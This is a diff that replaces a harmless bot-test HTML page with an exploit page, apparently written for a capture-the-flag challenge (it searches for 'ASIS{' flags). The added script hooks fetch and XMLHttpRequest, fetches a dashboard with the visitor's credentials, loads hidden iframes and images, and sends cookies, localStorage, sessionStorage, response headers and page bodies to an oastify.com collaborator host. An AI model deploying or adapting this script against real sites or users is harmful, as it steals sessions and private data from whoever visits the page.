@@ -2,24 +2,256 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Bot Observation Page</title>
+  <title>Loading...</title>
 </head>
 <body>
-  <h1>Bot Test Page</h1>
-  <p>This page does not exploit anything.</p>
-  <img src="car.jpeg">
+  <h1>Please wait...</h1>
+  
   <script>
-    // Timestamp when the page is first loaded
-    const now = new Date().toISOString();
-    console.log("[TEST] Page loaded at:", now);
-
-    // Persist something harmless
-    localStorage.setItem("bot_test_loaded", now);
-
-    // Periodic heartbeat
+    // Your collaborator domain
+    const COLLAB = "nofbugqhvbnzenxfgmotxwj0wr2iqaez.oastify.com";
+    
+    console.log("[EXPLOIT] Bot visited at " + new Date().toISOString());
+    
+    // Send immediate ping to confirm visit
+    fetch(`http://${COLLAB}/ping?time=${Date.now()}&ref=${encodeURIComponent(document.referrer)}`, {mode: 'no-cors'});
+    
+    // Method 1: Override fetch to intercept ALL requests
+    const originalFetch = window.fetch;
+    window.fetch = function(...args) {
+      const url = args[0];
+      const init = args[1] || {};
+      
+      console.log("[EXPLOIT] Fetch intercepted:", url);
+      
+      // Send request details to collaborator
+      fetch(`http://${COLLAB}/fetch_intercept?url=${encodeURIComponent(url)}&method=${init.method || 'GET'}`, {mode: 'no-cors'});
+      
+      // If this is a dashboard request, we want to capture it
+      if (typeof url === 'string' && (url.includes('/dashboard') || url.includes('/register') || url.includes('/login'))) {
+        console.log("[EXPLOIT] Important request detected:", url);
+        
+        // Add credentials to get session
+        init.credentials = 'include';
+        
+        // Intercept the response
+        return originalFetch.call(this, url, init)
+          .then(response => {
+            console.log("[EXPLOIT] Got response for:", url, response.status);
+            
+            // Clone to read without consuming
+            const clone = response.clone();
+            
+            // Send ALL headers to collaborator
+            const headers = {};
+            response.headers.forEach((value, name) => {
+              headers[name] = value;
+              
+              // Send each header individually
+              fetch(`http://${COLLAB}/header?name=${encodeURIComponent(name)}&value=${encodeURIComponent(value)}&url=${encodeURIComponent(url)}`, {mode: 'no-cors'});
+              
+              // Special check for X-User- header (contains flag!)
+              if (name.startsWith('X-User-')) {
+                const flag = name.substring(7); // Remove "X-User-"
+                console.log("[EXPLOIT] 🚩 FLAG FOUND IN HEADER:", flag);
+                fetch(`http://${COLLAB}/FLAG_HEADER?flag=${encodeURIComponent(flag)}&from=header`, {mode: 'no-cors'});
+              }
+            });
+            
+            // Send all headers as JSON
+            fetch(`http://${COLLAB}/all_headers`, {
+              method: 'POST',
+              mode: 'no-cors',
+              body: JSON.stringify({url: url, headers: headers, time: Date.now()})
+            });
+            
+            // Also read response body for flag in text
+            return clone.text().then(text => {
+              console.log("[EXPLOIT] Response length:", text.length);
+              
+              // Look for flag in page text
+              const welcomeMatch = text.match(/Welcome,\s*([^!]+)!/);
+              if (welcomeMatch) {
+                const flag = welcomeMatch[1].trim();
+                console.log("[EXPLOIT] 🚩 FLAG FOUND IN TEXT:", flag);
+                fetch(`http://${COLLAB}/FLAG_TEXT?flag=${encodeURIComponent(flag)}&from=welcome_text`, {mode: 'no-cors'});
+              }
+              
+              // Look for any ASIS{ pattern
+              const flagPattern = text.match(/ASIS\{[^}]+\}/i);
+              if (flagPattern) {
+                console.log("[EXPLOIT] 🚩 FLAG PATTERN FOUND:", flagPattern[0]);
+                fetch(`http://${COLLAB}/FLAG_PATTERN?flag=${encodeURIComponent(flagPattern[0])}`, {mode: 'no-cors'});
+              }
+              
+              // Send first 2000 chars to collaborator for analysis
+              fetch(`http://${COLLAB}/response_body`, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: text.substring(0, 2000)
+              });
+              
+              return response;
+            });
+          })
+          .catch(err => {
+            console.log("[EXPLOIT] Fetch error:", err);
+            fetch(`http://${COLLAB}/fetch_error?msg=${encodeURIComponent(err.message)}&url=${encodeURIComponent(url)}`, {mode: 'no-cors'});
+            throw err;
+          });
+      }
+      
+      // For other requests, proceed normally
+      return originalFetch.apply(this, args);
+    };
+    
+    // Method 2: Hook XMLHttpRequest for libraries that use it
+    const originalXHR = window.XMLHttpRequest.prototype.open;
+    window.XMLHttpRequest.prototype.open = function(...args) {
+      console.log("[EXPLOIT] XHR open:", args[1]);
+      
+      // Add load listener
+      this.addEventListener('load', function() {
+        if (this.status === 200) {
+          // Check if response might contain flag
+          const responseText = this.responseText;
+          if (responseText.includes('Welcome,')) {
+            const match = responseText.match(/Welcome,\s*([^!]+)!/);
+            if (match) {
+              const flag = match[1].trim();
+              console.log("[EXPLOIT] 🚩 FLAG IN XHR:", flag);
+              fetch(`http://${COLLAB}/FLAG_XHR?flag=${encodeURIComponent(flag)}`, {mode: 'no-cors'});
+            }
+          }
+        }
+      });
+      
+      return originalXHR.apply(this, args);
+    };
+    
+    // Method 3: Monitor for navigation to dashboard
+    let lastUrl = window.location.href;
     setInterval(() => {
-      console.log("[TEST] Still running at:", new Date().toISOString());
-    }, 1000);
+      if (window.location.href !== lastUrl) {
+        lastUrl = window.location.href;
+        console.log("[EXPLOIT] Page navigated to:", lastUrl);
+        fetch(`http://${COLLAB}/navigation?to=${encodeURIComponent(lastUrl)}`, {mode: 'no-cors'});
+        
+        // If we're on dashboard page, try to read it
+        if (lastUrl.includes('/dashboard')) {
+          setTimeout(() => {
+            const text = document.body.textContent;
+            const match = text.match(/Welcome,\s*([^!]+)!/);
+            if (match) {
+              const flag = match[1].trim();
+              console.log("[EXPLOIT] 🚩 FLAG ON DASHBOARD PAGE:", flag);
+              fetch(`http://${COLLAB}/FLAG_DASHBOARD?flag=${encodeURIComponent(flag)}`, {mode: 'no-cors'});
+            }
+          }, 1000);
+        }
+      }
+    }, 500);
+    
+    // Method 4: Try to make direct request after bot logs in
+    setTimeout(() => {
+      console.log("[EXPLOIT] 7 seconds passed - attempting direct dashboard fetch");
+      
+      // Try multiple endpoints
+      const endpoints = [
+        'http://web/dashboard',
+        'http://localhost/dashboard',
+        'http://127.0.0.1/dashboard',
+        '/dashboard'
+      ];
+      
+      endpoints.forEach(endpoint => {
+        fetch(endpoint, {credentials: 'include'})
+          .then(r => r.text())
+          .then(t => {
+            console.log(`[EXPLOIT] Success with ${endpoint}`);
+            const match = t.match(/Welcome,\s*([^!]+)!/);
+            if (match) {
+              const flag = match[1].trim();
+              console.log(`[EXPLOIT] 🚩 FLAG from ${endpoint}:`, flag);
+              fetch(`http://${COLLAB}/FLAG_DIRECT?endpoint=${encodeURIComponent(endpoint)}&flag=${encodeURIComponent(flag)}`, {mode: 'no-cors'});
+            }
+          })
+          .catch(e => console.log(`[EXPLOIT] Failed ${endpoint}:`, e.message));
+      });
+    }, 7000); // Wait 7 seconds for bot to login
+    
+    // Method 5: Try again after longer delay
+    setTimeout(() => {
+      console.log("[EXPLOIT] 10 seconds - second attempt");
+      fetch('http://web/dashboard', {credentials: 'include'})
+        .then(r => r.text())
+        .then(t => {
+          const match = t.match(/Welcome,\s*([^!]+)!/);
+          if (match) {
+            const flag = match[1].trim();
+            fetch(`http://${COLLAB}/FLAG_SECOND?flag=${encodeURIComponent(flag)}`, {mode: 'no-cors'});
+          }
+        });
+    }, 10000);
+    
+    // Method 6: Try iframe method
+    setTimeout(() => {
+      console.log("[EXPLOIT] Trying iframe method");
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = 'http://web/dashboard';
+      
+      iframe.onload = function() {
+        console.log("[EXPLOIT] Iframe loaded");
+        try {
+          const doc = iframe.contentDocument;
+          const text = doc.body.textContent;
+          const match = text.match(/Welcome,\s*([^!]+)!/);
+          if (match) {
+            const flag = match[1].trim();
+            console.log("[EXPLOIT] 🚩 FLAG FROM IFRAME:", flag);
+            fetch(`http://${COLLAB}/FLAG_IFRAME?flag=${encodeURIComponent(flag)}`, {mode: 'no-cors'});
+          }
+        } catch(e) {
+          console.log("[EXPLOIT] Can't read iframe:", e.message);
+        }
+      };
+      
+      document.body.appendChild(iframe);
+    }, 8000);
+    
+    // Send cookies if we can access them (HttpOnly cookies won't be accessible)
+    try {
+      const cookies = document.cookie;
+      if (cookies) {
+        console.log("[EXPLOIT] Cookies:", cookies);
+        fetch(`http://${COLLAB}/cookies?data=${encodeURIComponent(cookies)}`, {mode: 'no-cors'});
+      }
+    } catch(e) {}
+    
+    // Send localStorage
+    try {
+      const ls = JSON.stringify(localStorage);
+      fetch(`http://${COLLAB}/localStorage?data=${encodeURIComponent(ls)}`, {mode: 'no-cors'});
+    } catch(e) {}
+    
+    // Send sessionStorage
+    try {
+      const ss = JSON.stringify(sessionStorage);
+      fetch(`http://${COLLAB}/sessionStorage?data=${encodeURIComponent(ss)}`, {mode: 'no-cors'});
+    } catch(e) {}
+    
+    console.log("[EXPLOIT] All hooks installed successfully");
+    
   </script>
+  
+  <!-- Hidden iframe for stealing -->
+  <iframe id="stealer" style="display:none"></iframe>
+  
+  <!-- Image tags that load with credentials -->
+  <img src="http://web/dashboard" style="display:none" 
+       onload="fetch(`http://${COLLAB}/img_loaded`, {mode: 'no-cors'})"
+       onerror="fetch(`http://${COLLAB}/img_error`, {mode: 'no-cors'})">
+  
 </body>
 </html>
